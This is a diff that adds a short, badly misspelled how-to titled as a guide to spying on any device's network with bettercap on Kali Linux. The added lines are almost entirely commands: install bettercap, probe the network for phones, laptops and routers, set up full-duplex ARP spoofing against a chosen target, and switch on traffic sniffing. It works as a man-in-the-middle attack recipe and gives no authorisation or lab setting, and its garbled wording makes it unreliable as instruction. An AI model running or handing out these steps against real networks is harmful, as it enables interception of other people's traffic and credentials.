@@ -1,2 +1,18 @@
+How to Spy on Any Device's Network using Bettercap in Kali Linux?
 manin the midle attack follow commads.
-  scan he environment and use bettercap to hits networks 
+scan he environment and use bettercap to hits networks
+sudo apt update
+sudo apt install bettercap 
+sudo bettercap -iface eth0
+get to bettercap interface 
+commad ordo help for more option
+net.probe on for the connection devicess (for ip addresses tv laptops routers phone, tablet etc)
+net.show for result
+or more get on trget ip
+command 
+set arp.spoof.fullduplex true.
+set arp.spoof.target (put the target machine frouter or any device)
+arp spoof on
+net.sniff on
+test for web result(www.vulnweb.com) for test
+exit a;way use https
